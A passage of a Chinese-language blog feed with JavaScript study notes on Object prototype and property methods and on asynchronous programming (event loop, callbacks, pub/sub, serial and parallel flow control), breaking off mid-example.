<p>因此，获取实例对象<code>obj</code>的原型对象，有三种方法。</p>
<ul>
<li><code>obj.__proto__</code></li>
<li><code>obj.constructor.prototype</code></li>
<li><code>Object.getPrototypeOf(obj)</code></li>
</ul>
<p>上面三种方法之中，前两种都不是很可靠。<code>__proto__</code>属性只有浏览器才需要部署，其他环境可以不部署。而<code>obj.constructor.prototype</code>在手动改变原型对象时，可能会失效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> P = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> P();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> C = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">C.prototype = p;</span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">c.constructor.prototype === p <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，构造函数<code>C</code>的原型对象被改成了<code>p</code>，但是实例对象的<code>c.constructor.prototype</code>却没有指向<code>p</code>。所以，在改变原型对象时，一般要同时设置<code>constructor</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">C.prototype = p;</span><br><span class="line">C.prototype.constructor = C;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> C();</span><br><span class="line">c.constructor.prototype === p <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>因此，推荐使用第三种<code>Object.getPrototypeOf</code>方法，获取原型对象</p>
<h4 id="4-7-Object-getOwnPropertyNames"><a href="#4-7-Object-getOwnPropertyNames" class="headerlink" title="4.7 Object.getOwnPropertyNames()"></a>4.7 Object.getOwnPropertyNames()</h4><p><code>Object.getOwnPropertyNames</code>方法返回一个数组，成员是参数对象本身的所有属性的键名，不包含继承的属性键名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">Date</span>)</span><br><span class="line"><span class="comment">// [&quot;parse&quot;, &quot;arguments&quot;, &quot;UTC&quot;, &quot;caller&quot;, &quot;name&quot;, &quot;prototype&quot;, &quot;now&quot;, &quot;length&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.getOwnPropertyNames</code>方法返回<code>Date</code>所有自身的属性名。</p>
<p>对象本身的属性之中，有的是可以遍历的（enumerable），有的是不可以遍历的。<code>Object.getOwnPropertyNames</code>方法返回所有键名，不管是否可以遍历。只获取那些可以遍历的属性，使用<code>Object.keys</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.keys(<span class="built_in">Date</span>) <span class="comment">// []</span></span><br></pre></td></tr></table></figure>
<p>上面代码表明，<code>Date</code>对象所有自身的属性，都是不可以遍历的。</p>
<h4 id="4-8-Object-prototype-hasOwnProperty"><a href="#4-8-Object-prototype-hasOwnProperty" class="headerlink" title="4.8 Object.prototype.hasOwnProperty()"></a>4.8 Object.prototype.hasOwnProperty()</h4><p>对象实例的<code>hasOwnProperty</code>方法返回一个布尔值，用于判断某个属性定义在对象自身，还是定义在原型链上。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>.hasOwnProperty(<span class="string">&#x27;length&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Date</span>.hasOwnProperty(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码表明，<code>Date.length</code>（构造函数<code>Date</code>可以接受多少个参数）是<code>Date</code>自身的属性，<code>Date.toString</code>是继承的属性。</p>
<p>另外，<code>hasOwnProperty</code>方法是 JavaScript 之中唯一一个处理对象属性时，不会遍历原型链的方法。</p>
<h4 id="4-9-in-运算符和-for…in-循环"><a href="#4-9-in-运算符和-for…in-循环" class="headerlink" title="4.9 in 运算符和 for…in 循环"></a>4.9 in 运算符和 for…in 循环</h4><p><code>in</code>运算符返回一个布尔值，表示一个对象是否具有某个属性。它不区分该属性是对象自身的属性，还是继承的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;length&#x27;</span> <span class="keyword">in</span> <span class="built_in">Date</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;toString&#x27;</span> <span class="keyword">in</span> <span class="built_in">Date</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>in</code>运算符常用于检查一个属性是否存在。</p>
<p>获得对象的所有可遍历属性（不管是自身的还是继承的），可以使用<code>for...in</code>循环。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123; <span class="attr">p1</span>: <span class="number">123</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o2 = <span class="built_in">Object</span>.create(o1, &#123;</span><br><span class="line">  p2: &#123; <span class="attr">value</span>: <span class="string">&quot;abc&quot;</span>, <span class="attr">enumerable</span>: <span class="literal">true</span> &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (p <span class="keyword">in</span> o2) &#123;</span><br><span class="line">  <span class="built_in">console</span>.info(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// p2</span></span><br><span class="line"><span class="comment">// p1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>o2</code>的<code>p2</code>属性是自身的，<code>p1</code>属性是继承的。这两个属性都会被<code>for...in</code>循环遍历。</p>
<p>为了在<code>for...in</code>循环中获得对象自身的属性，可以采用<code>hasOwnProperty</code>方法判断一下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> name <span class="keyword">in</span> object ) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( object.hasOwnProperty(name) ) &#123;</span><br><span class="line">    <span class="comment">/* loop code */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获得对象的所有属性（不管是自身的还是继承的，也不管是否可枚举），可以使用下面的函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritedPropertyNames</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> props = &#123;&#125;;</span><br><span class="line">  <span class="keyword">while</span>(obj) &#123;</span><br><span class="line">    <span class="built_in">Object</span>.getOwnPropertyNames(obj).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">p</span>) </span>&#123;</span><br><span class="line">      props[p] = <span class="literal">true</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    obj = <span class="built_in">Object</span>.getPrototypeOf(obj);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.getOwnPropertyNames(props);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码依次获取<code>obj</code>对象的每一级原型对象“自身”的属性，从而获取<code>obj</code>对象的“所有”属性，不管是否可遍历。</p>
<p>下面是一个例子，列出<code>Date</code>对象的所有属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">inheritedPropertyNames(<span class="built_in">Date</span>)</span><br><span class="line"><span class="comment">// [</span></span><br><span class="line"><span class="comment">//  &quot;caller&quot;,</span></span><br><span class="line"><span class="comment">//  &quot;constructor&quot;,</span></span><br><span class="line"><span class="comment">//  &quot;toString&quot;,</span></span><br><span class="line"><span class="comment">//  &quot;UTC&quot;,</span></span><br><span class="line"><span class="comment">//  ...</span></span><br><span class="line"><span class="comment">// ]</span></span><br></pre></td></tr></table></figure>

<h4 id="4-10-对象的拷贝"><a href="#4-10-对象的拷贝" class="headerlink" title="4.10 对象的拷贝"></a>4.10 对象的拷贝</h4><p>如果要拷贝一个对象，需要做到下面两件事情。</p>
<ul>
<li>确保拷贝后的对象，与原对象具有同样的原型。</li>
<li>确保拷贝后的对象，与原对象具有同样的实例属性。</li>
</ul>
<p>下面就是根据上面两点，实现的对象拷贝函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copyObject</span>(<span class="params">orig</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> copy = <span class="built_in">Object</span>.create(<span class="built_in">Object</span>.getPrototypeOf(orig));</span><br><span class="line">  copyOwnPropertiesFrom(copy, orig);</span><br><span class="line">  <span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copyOwnPropertiesFrom</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Object</span></span><br><span class="line">    .getOwnPropertyNames(source)</span><br><span class="line">    .forEach(<span class="function"><span class="keyword">function</span> (<span class="params">propKey</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> desc = <span class="built_in">Object</span>.getOwnPropertyDescriptor(source, propKey);</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(target, propKey, desc);</span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一种更简单的写法，是利用 ES2017 才引入标准的<code>Object.getOwnPropertyDescriptors</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copyObject</span>(<span class="params">orig</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.create(</span><br><span class="line">    <span class="built_in">Object</span>.getPrototypeOf(orig),</span><br><span class="line">    <span class="built_in">Object</span>.getOwnPropertyDescriptors(orig)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS面向对象编程-Object对象的相关方法</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0031</title>
    <url>/2021/05/20/%E6%89%93%E5%8D%A10031/</url>
    <content><![CDATA[<p><font color=#8c531b>步伐虽小，密而不停</font></p>
<h2 id="JS异步操作"><a href="#JS异步操作" class="headerlink" title="JS异步操作"></a>JS异步操作</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><h4 id="1-1单线程模型"><a href="#1-1单线程模型" class="headerlink" title="1.1单线程模型"></a>1.1单线程模型</h4><p>单线程模型指的是，JavaScript 只在一个线程上运行。也就是说，JavaScript 同时只能执行一个任务，其他任务都必须在后面排队等待。</p>
<p>注意，JavaScript 只在一个线程上运行，不代表 JavaScript 引擎只有一个线程。事实上，JavaScript 引擎有多个线程，单个脚本只能在一个线程上运行（称为主线程），其他线程都是在后台配合。</p>
<p>JavaScript 之所以采用单线程，而不是多线程，跟历史有关系。JavaScript 从诞生起就是单线程，原因是不想让浏览器变得太复杂，因为多线程需要共享资源、且有可能修改彼此的运行结果，对于一种网页脚本语言来说，这就太复杂了。如果 JavaScript 同时有两个线程，一个线程在网页 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？是不是还要有锁机制？所以，为了避免复杂性，JavaScript 一开始就是单线程，这已经成了这门语言的核心特征，将来也不会改变。</p>
<p>这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段 JavaScript 代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。JavaScript 语言本身并不慢，慢的是读写外部数据，比如等待 Ajax 请求返回结果。这个时候，如果对方服务器迟迟没有响应，或者网络不通畅，就会导致脚本的长时间停滞。</p>
<p>如果排队是因为计算量大，CPU 忙不过来，倒也算了，但是很多时候 CPU 是闲着的，因为 IO 操作（输入输出）很慢（比如 Ajax 操作从网络读取数据），不得不等着结果出来，再往下执行。JavaScript 语言的设计者意识到，这时 CPU 完全可以不管 IO 操作，挂起处于等待中的任务，先运行排在后面的任务。等到 IO 操作返回了结果，再回过头，把挂起的任务继续执行下去。这种机制就是 JavaScript 内部采用的“事件循环”机制（Event Loop）。</p>
<p>单线程模型虽然对 JavaScript 构成了很大的限制，但也因此使它具备了其他语言不具备的优势。如果用得好，JavaScript 程序是不会出现堵塞的，这就是为什么 Node 可以用很少的资源，应付大流量访问的原因。</p>
<p>为了利用多核 CPU 的计算能力，HTML5 提出 Web Worker 标准，允许 JavaScript 脚本创建多个线程，但是子线程完全受主线程控制，且不得操作 DOM。所以，这个新标准并没有改变 JavaScript 单线程的本质。</p>
<span id="more"></span>
<h4 id="1-2-同步任务和异步任务"><a href="#1-2-同步任务和异步任务" class="headerlink" title="1.2 同步任务和异步任务"></a>1.2 同步任务和异步任务</h4><p>程序里面所有的任务，可以分成两类：同步任务（synchronous）和异步任务（asynchronous）。</p>
<p>同步任务是那些没有被引擎挂起、在主线程上排队执行的任务。只有前一个任务执行完毕，才能执行后一个任务。</p>
<p>异步任务是那些被引擎放在一边，不进入主线程、而进入任务队列的任务。只有引擎认为某个异步任务可以执行了（比如 Ajax 操作从服务器得到了结果），该任务（采用回调函数的形式）才会进入主线程执行。排在异步任务后面的代码，不用等待异步任务结束会马上运行，也就是说，异步任务不具有“堵塞”效应。</p>
<p>举例来说，Ajax 操作可以当作同步任务处理，也可以当作异步任务处理，由开发者决定。如果是同步任务，主线程就等着 Ajax 操作返回结果，再往下执行；如果是异步任务，主线程在发出 Ajax 请求以后，就直接往下执行，等到 Ajax 操作有了结果，主线程再执行对应的回调函数。</p>
<h4 id="1-3-任务队列和事件循环"><a href="#1-3-任务队列和事件循环" class="headerlink" title="1.3 任务队列和事件循环"></a>1.3 任务队列和事件循环</h4><p>JavaScript 运行时，除了一个正在运行的主线程，引擎还提供一个任务队列（task queue），里面是各种需要当前程序处理的异步任务。（实际上，根据异步任务的类型，存在多个任务队列。为了方便理解，这里假设只存在一个队列。）</p>
<p>首先，主线程会去执行所有的同步任务。等到同步任务全部执行完，就会去看任务队列里面的异步任务。如果满足条件，那么异步任务就重新进入主线程开始执行，这时它就变成同步任务了。等到执行完，下一个异步任务再进入主线程开始执行。一旦任务队列清空，程序就结束执行。</p>
<p>异步任务的写法通常是回调函数。一旦异步任务重新进入主线程，就会执行对应的回调函数。如果一个异步任务没有回调函数，就不会进入任务队列，也就是说，不会重新进入主线程，因为没有用回调函数指定下一步的操作。</p>
<p>JavaScript 引擎怎么知道异步任务有没有结果，能不能进入主线程呢？答案就是引擎在不停地检查，一遍又一遍，只要同步任务执行完了，引擎就会去检查那些挂起来的异步任务，是不是可以进入主线程了。这种循环检查的机制，就叫做事件循环（Event Loop）。维基百科的定义是：“事件循环是一个程序结构，用于等待和发送消息和事件（a programming construct that waits for and dispatches events or messages in a program）”。</p>
<h4 id="1-4-异步操作的模式"><a href="#1-4-异步操作的模式" class="headerlink" title="1.4 异步操作的模式"></a>1.4 异步操作的模式</h4><p>下面总结一下异步操作的几种模式。</p>
<h5 id="1-4-1-回调函数"><a href="#1-4-1-回调函数" class="headerlink" title="1.4.1 回调函数"></a>1.4.1 回调函数</h5><p>回调函数是异步操作最基本的方法。</p>
<p>下面是两个函数<code>f1</code>和<code>f2</code>，编程的意图是<code>f2</code>必须等到<code>f1</code>执行完成，才能执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f1();</span><br><span class="line">f2();</span><br></pre></td></tr></table></figure>
<p>上面代码的问题在于，如果<code>f1</code>是异步操作，<code>f2</code>会立即执行，不会等到<code>f1</code>结束再执行。</p>
<p>这时，可以考虑改写<code>f1</code>，把<code>f2</code>写成<code>f1</code>的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  callback();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f1(f2);</span><br></pre></td></tr></table></figure>
<p>回调函数的优点是简单、容易理解和实现，缺点是不利于代码的阅读和维护，各个部分之间高度耦合（coupling），使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），而且每个任务只能指定一个回调函数。</p>
<h5 id="1-4-2-事件监听"><a href="#1-4-2-事件监听" class="headerlink" title="1.4.2 事件监听"></a>1.4.2 事件监听</h5><p>另一种思路是采用事件驱动模式。异步任务的执行不取决于代码的顺序，而取决于某个事件是否发生。</p>
<p>还是以<code>f1</code>和<code>f2</code>为例。首先，为<code>f1</code>绑定一个事件（这里采用的 jQuery 的写法）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">f1.on(<span class="string">&#x27;done&#x27;</span>, f2);</span><br></pre></td></tr></table></figure>
<p>上面这行代码的意思是，当<code>f1</code>发生<code>done</code>事件，就执行<code>f2</code>。然后，对<code>f1</code>进行改写：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    f1.trigger(<span class="string">&#x27;done&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>f1.trigger(&#39;done&#39;)</code>表示，执行完成后，立即触发<code>done</code>事件，从而开始执行<code>f2</code>。</p>
<p>这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以“去耦合”（decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。</p>
<h5 id="1-4-3-发布-订阅"><a href="#1-4-3-发布-订阅" class="headerlink" title="1.4.3 发布/订阅"></a>1.4.3 发布/订阅</h5><p>事件完全可以理解成“信号”，如果存在一个“信号中心”，某个任务执行完成，就向信号中心“发布”（publish）一个信号，其他任务可以向信号中心“订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布/订阅模式”（publish-subscribe pattern），又称“观察者模式”（observer pattern）。</p>
<p>这个模式有多种实现，下面采用的是 Ben Alman 的 Tiny Pub/Sub，这是 jQuery 的一个插件。</p>
<p>首先，<code>f2</code>向信号中心<code>jQuery</code>订阅<code>done</code>信号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">jQuery.subscribe(<span class="string">&#x27;done&#x27;</span>, f2);</span><br></pre></td></tr></table></figure>
<p>然后，<code>f1</code>进行如下改写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    jQuery.publish(<span class="string">&#x27;done&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>jQuery.publish(&#39;done&#39;)</code>的意思是，<code>f1</code>执行完成后，向信号中心<code>jQuery</code>发布<code>done</code>信号，从而引发<code>f2</code>的执行。</p>
<p><code>f2</code>完成执行后，可以取消订阅（unsubscribe）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">jQuery.unsubscribe(<span class="string">&#x27;done&#x27;</span>, f2);</span><br></pre></td></tr></table></figure>
<p>这种方法的性质与“事件监听”类似，但是明显优于后者。因为可以通过查看“消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。</p>
<h4 id="1-5-异步操作的流程控制"><a href="#1-5-异步操作的流程控制" class="headerlink" title="1.5 异步操作的流程控制"></a>1.5 异步操作的流程控制</h4><p>如果有多个异步操作，就存在一个流程控制的问题：如何确定异步操作执行的顺序，以及如何保证遵守这种顺序。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">async</span>(<span class="params">arg, callback</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;参数为 &#x27;</span> + arg +<span class="string">&#x27; , 1秒后返回结果&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; callback(arg * <span class="number">2</span>); &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码的<code>async</code>函数是一个异步任务，非常耗时，每次执行需要1秒才能完成，然后再调用回调函数。</p>
<p>如果有六个这样的异步任务，需要全部完成后，才能执行最后的<code>final</code>函数。请问应该如何安排操作流程？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">final</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;完成: &#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span>(<span class="number">1</span>, <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">async</span>(<span class="number">2</span>, <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">async</span>(<span class="number">3</span>, <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">async</span>(<span class="number">4</span>, <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">async</span>(<span class="number">5</span>, <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">async</span>(<span class="number">6</span>, final);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 参数为 1 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 2 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 3 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 4 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 5 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 参数为 6 , 1秒后返回结果</span></span><br><span class="line"><span class="comment">// 完成:  12</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，六个回调函数的嵌套，不仅写起来麻烦，容易出错，而且难以维护。</p>
<h5 id="1-5-1-串行执行"><a href="#1-5-1-串行执行" class="headerlink" title="1.5.1 串行执行"></a>1.5.1 串行执行</h5><p>我们可以编写一个流程控制函数，让它来控制异步任务，一个任务完成以后，再执行另一个。这就叫串行执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> items = [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> ];</span><br><span class="line"><span class="keyword">var</span> results = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">async</span>(<span class="params">arg, callback</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;参数为 &#x27;</span> + arg +<span class="string">&#x27; , 1秒后返回结果&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; callback(arg * <span class="number">2</span>); &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">final</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;完成: &#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">series</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(item) &#123;</span><br><span class="line">    <span class="keyword">async</span>( item, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      results.push(result);</span><br><span class="line">      <span class="keyword">return</span> series(items.shift());</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> final(results[results.length - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">series(items.shift());</span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>series</code>就是串行函数，它会依次执行异步任务，所有任务都完成后，才会执行<code>final</code>函数。<code>items</code>数组保存每一个异步任务的参数，<code>results</code>数组保存每一个异步任务的运行结果。</p>
<p>注意，上面的写法需要六秒，才能完成整个脚本。</p>
<h5 id="1-5-2-并行执行"><a href="#1-5-2-并行执行" class="headerlink" title="1.5.2 并行执行"></a>1.5.2 并行执行</h5><p>流程控制函数也可以是并行执行，即所有异步任务同时执行，等到全部完成以后，才执行<code>final</code>函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> items = [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> ];</span><br><span class="line"><span class="keyword">var</span> results = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">async</span>(<span class="params">arg, callback</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;参数为 &#x27;</span> + arg +<span class="string">&#x27; , 1秒后返回结果&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; callback(arg * <span class="number">2</span>); &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">final</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;完成: &#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">items.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">async</span>(item, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">    results.push(result);</span><br><span class="line">    <span class="keyword">if</span>(results.length === items.length) &#123;</span><br><span class="line">      final(results[results.length - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>forEach</code>方法会同时发起六个异步任务，等到它们全部完成以后，才会执行<code>final</code>函数。</p>
<p>相比而言，上面的写法只要一秒，就能完成整个脚本。这就是说，并行执行的效率较高，比起串行执行一次只能执行一个任务，较为节约时间。但是问题在于如果并行的任务较多，很容易耗尽系统资源，拖慢运行速度。因此有了第三种流程控制方式。</p>
<h5 id="1-5-3-并行与串行的结合"><a href="#1-5-3-并行与串行的结合" class="headerlink" title="1.5.3 并行与串行的结合"></a>1.5.3 并行与串行的结合</h5><p>所谓并行与串行的结合，就是设置一个门槛，每次最多只能并行执行n个异步任务，这样就避免了过分占用系统资源。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> items = [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> ];</span><br><span class="line"><span class="keyword">var</span> results = [];</span><br><span class="line"><span class="keyword">var</span> running = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> limit = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">async</span>(<span class="params">arg, callback</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;参数为 &#x27;</span> + arg +<span class="string">&#x27; , 1秒后返回结果&#x27;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; callback(arg * <span class="number">2</span>); &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">final</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;完成: &#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">launcher</span>(<span 